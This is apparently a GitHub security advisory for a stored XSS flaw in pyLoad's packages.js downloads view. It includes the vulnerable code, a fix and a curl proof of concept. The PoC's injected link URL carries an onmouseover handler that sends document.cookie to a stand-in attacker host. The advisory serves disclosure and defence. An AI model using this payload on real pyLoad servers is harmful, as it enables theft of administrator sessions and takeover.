# [H] pyLoad is vulnerable to stored XSS in Downloads view via unsanitized link URL in packages.js template literal

## Summary
Severity: High
Advisory: GHSA-fcjq-435v-jx94
CVE: CVE-2026-45348
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-fcjq-435v-jx94
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0

## Details
## Summary

The `packages.js` template at `src/pyload/webui/app/themes/modern/templates/js/packages.js:172` interpolates a stored link URL into a template literal inside single-quoted HTML and then writes the result to the DOM via `$(div).html(html)`. No escaping runs between the API value and `innerHTML`. An attacker (Alice) who can submit a package link puts a single quote plus event handler into the URL, breaks out of the attribute, and executes JavaScript in every operator's browser that opens the downloads view. The theme does not set a Content Security Policy that restricts inline script or event handlers.

## Details

**Sink**: `src/pyload/webui/app/themes/modern/templates/js/packages.js:165-188`:

```javascript
const html = `
    <span class='child_status'>
      <span style='margin-right: 2px;color: #337ab7;' class='${link.icon}'></span>
    </span>
    <span style='font-size: 16px; font-weight: bold;'>
      <a onclick='return false' href='${link.url}'>${link.name}</a>
    </span><br/>
    <div class='child_secrow' ...>
      <span class='child_status' ...>${link.statusmsg}</span>&nbsp;${link.error}&nbsp;
      <span class='child_status' ...>${link.format_size}</span>
      <span class='child_status' ...> ${link.plugin}</span>...
    </div>`;

const div = document.createElement("div");
$(div).attr("id", `file_${link.id}`);
$(div).css("padding-left", "30px");
$(div).css("cursor", "grab");
$(div).addClass("child");
$(div).html(html);
```

`link.url` flows in from `/api/get_package_data`, which returns the URL exactly as stored. Seven other fields on the same element (`link.name`, `link.statusmsg`, `link.error`, `link.format_size`, `link.plugin`, `link.icon`, `link.id`) share the same unescaped injection surface.

**Source**: `src/pyload/core/api/__init__.py:541-600` (`add_package`) and the `/api/add_package` JSON route store the attacker-supplied `links` list without HTML escaping. The `add_package` URL sanitizer only strips `http://`, `https://`, `../`, `..\\`, `:`, and `/` from the folder *name*, not the link URL itself.

**Mitigation gap**: `src/pyload/webui/app/__init__.py:63-72` sets security headers but has no `Content-Security-Policy` header. The only script-related header is `X-XSS-Protection`, which is a no-op on modern browsers.

## Proof of Concept

**Actor**: Alice (authenticated user with `Perms.ADD`). Reproduces against pyload 0.5.0-dev at `f081a16`.

```bash
TARGET="http://<pyload-host>:<port>"

# Alice logs in.
CSRF=$(curl -sS -c /tmp/alice.jar "$TARGET/login" | grep -oP 'name="csrf_token" value="\K[^"]+')
curl -sS -b /tmp/alice.jar -c /tmp/alice.jar -X POST "$TARGET/login" \
    -d "csrf_token=$CSRF&do=login&username=alice&password=alice123" -o /dev/null
API_CSRF=$(curl -sS -b /tmp/alice.jar "$TARGET/" | grep -oP 'name="csrf-token" content="\K[^"]+')

# Alice creates a package whose link URL breaks out of the href attribute
# and installs an onmouseover payload.
curl -sS -b /tmp/alice.jar -X POST "$TARGET/api/add_package" \
    -H "X-CSRFToken: $API_CSRF" -H "Content-Type: application/json" \
    -d $'{"name":"xss-pkg","links":["http://x\' onmouseover=\'fetch(`//attacker.example/`+document.cookie)"]}'
```

The package lands in the collector (the default destination). Alice can also pass `"dest":1` to place it in the queue instead. Both `/collector` and `/queue` render the same `packages.html` template, which loads `packages.js`.

When any user (including the admin `pyload`) opens `/collector` or `/queue` and hovers the injected file row, the browser parses the anchor as:

```html
<a onclick='return false' href='http://x' onmouseover='fetch(`//attacker.example/`+document.cookie)'>http://x' onmouseover='fetch(`//attacker.example/`+document.cookie)</a>
```

The `onmouseover` handler fires on hover and exfiltrates the session cookie. A `javascript:` URL in the `href` triggers on click without hover.

## Impact

Any user who can reach `/api/add_package` (which covers the `Perms.ADD` role, the common baseline for operator users) plants JavaScript that runs in an admin's browser the next time that admin opens the downloads view. The admin's session cookie is in the same origin, so Alice receives it directly. Holding the admin cookie, Alice hits every admin-only endpoint: arbitrary plugin upload, configuration rewrite, reconnect-script RCE, and so on. The attack is stored, persists across reboots, and does not require any interaction from the victim beyond visiting `/collector` or `/queue`, the two pages operators use constantly.

The CNL Blueprint exposes a sibling attack surface: when pyload runs with the ClickNLoad handler enabled, an unauthenticated network attacker calls `POST /flash/add` with the same injected URL and reaches the same sink without logging in.

`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (High, 8.3). CWE-79.

## Recommended Fix

Two changes.

First, escape every `${link.*}` interpolation in the template. jQuery's `.text()` escapes by default; structure the render so attacker-controlled strings never reach `.html()`:

```javascript
const a = $("<a/>").attr("href", link.url).text(link.name);
const status = $("<span/>").text(link.statusmsg);
// ... build the DOM with .text() / .attr() calls ...
$(div).append(a).append(status);
```

If keeping the template-literal style, at minimum wrap every `${link.*}` in a helper that HTML-escapes:

```javascript
const esc = (s) => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;")
    .replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
```

Second, deploy a strict CSP. `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'self'` kills the inline-handler class entirely, and pyload's own assets already load from `'self'`.

Audit the sibling templates (`queue.js`, `dashboard.js`, all admin themes) for the same pattern.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-fcjq-435v-jx94
- https://nvd.nist.gov/vuln/detail/CVE-2026-45348
- https://github.com/pyload/pyload
